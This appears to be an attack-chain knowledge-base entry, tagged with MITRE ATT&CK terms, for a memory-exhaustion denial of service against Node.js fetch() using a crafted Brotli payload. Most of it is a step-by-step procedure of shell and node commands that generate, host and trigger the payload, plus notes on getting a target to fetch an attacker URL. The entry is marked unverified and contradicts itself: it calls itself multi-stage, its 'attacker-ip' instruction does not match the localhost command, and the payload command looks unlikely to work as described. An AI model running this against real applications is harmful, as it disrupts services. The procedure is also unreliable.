---
id: 123e4567-e89b-12d3-a456-426614174000
name: DoS via Resource Exhaustion in Node.js fetch() Brotli Decoding
tags:
  - dos
  - resource-exhaustion
  - brotli
  - node.js
type: attack_chain
tools:
  - '[[tools/Brotli]]'
tactics:
  - '[[Impact]]'
verified: false
platforms:
  - Node.js
submitted: true
complexity: low
created_at: '2024-10-04T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Brotli-Decoding-DoS-in-Node-js]]'
step_count: 1
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:55.650Z'
description: >-
  A single-stage attack exploiting the lack of resource limits in Node.js
  fetch() during Brotli decompression to cause memory exhaustion and deny
  service to the target application.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
---

# DoS via Resource Exhaustion in Node.js fetch() Brotli Decoding

Multi-stage attack chain demonstrating a complete attack workflow.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~2 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Host Malicious Brotli Payload] --> B[Trigger Fetch in Target]
    B --> C[Memory Exhaustion and DoS]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Brotli]]
- Python (for simple HTTP server)
- Node.js (vulnerable version, e.g., <18.20.3 or affected)

### Target Environment

- Node.js runtime (platform: Node.js)
- Application using fetch() to retrieve content from untrusted URLs
- No specific ports/services required beyond HTTP access to attacker-controlled server

### Initial Access Requirements

- Ability to influence the URL fetched by the target Node.js application (e.g., via user input, API parameter, or SSRF vector)
- Network access to host the malicious payload
- No prior credentials needed if URL control is direct

## Detailed Attack Procedures

### Step 1: Trigger Brotli DoS
procedure: [[procedures/Exploit-Brotli-Decoding-DoS-in-Node-js]]

**Objective**: Supply a maliciously crafted Brotli-compressed resource to the Node.js fetch() function, causing excessive memory allocation during decoding and leading to process crash or service disruption.

**Instructions**: First, generate a malicious Brotli payload using [[commands/generate-malicious-brotli]] to create a compressed file designed to exhaust memory on decompression:

```bash
echo 'A' | dd if=/dev/stdin bs=1M count=10000 | brotli --best -o malicious.br -
```

Then, host the payload on a simple HTTP server using [[commands/host-simple-server]]:

```bash
python3 -m http.server 8080
```

Finally, trigger the fetch in a vulnerable Node.js environment using [[commands/run-vulnerable-fetch]] (replace http://attacker-ip:8080 with your server):

```bash
node --experimental-fetch -e "fetch('http://localhost:8080/malicious.br').then(r => r.arrayBuffer()).then(buf => console.log('Decoded:', buf.length)).catch(e => console.error(e));"
```

**Expected Output**: The Node.js process will consume excessive memory (e.g., >1GB spike) during Brotli decoding, potentially leading to OOM killer activation, process termination, or application crash. Monitor with tools like `top` or `htop` to observe memory usage.

**Success Indicators**:
- Sharp increase in resident memory usage for the Node.js process
- Process termination or error like "JavaScript heap out of memory"
- Service logs indicating fetch failure due to resource exhaustion

## Attack Chain Summary

### Key Achievements

1. Successful delivery of malicious Brotli payload via controlled URL
2. Triggered uncontrolled memory allocation in fetch() Brotli decoder
3. Achieved denial of service through process exhaustion and disruption

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Endpoint Denial of Service]]

### MITRE ATT&CK Tactics

- [[Impact]]

---

*Last updated: 2024-10-04T00:00:00Z*
